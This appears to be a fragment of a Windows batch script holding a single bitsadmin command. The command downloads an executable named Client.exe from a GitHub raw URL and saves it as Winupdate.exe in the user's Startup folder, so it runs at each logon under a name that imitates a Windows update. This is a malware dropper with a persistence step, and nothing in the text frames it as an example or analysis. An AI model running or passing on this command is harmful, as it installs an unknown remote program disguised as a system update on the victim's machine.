...
bitsadmin /transfer Packages /download /priority foreground https://github.com/AluraFromTesco/Alura-Loves/raw/main/Client.exe "C:\Users\horror\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Winupdate.exe" 
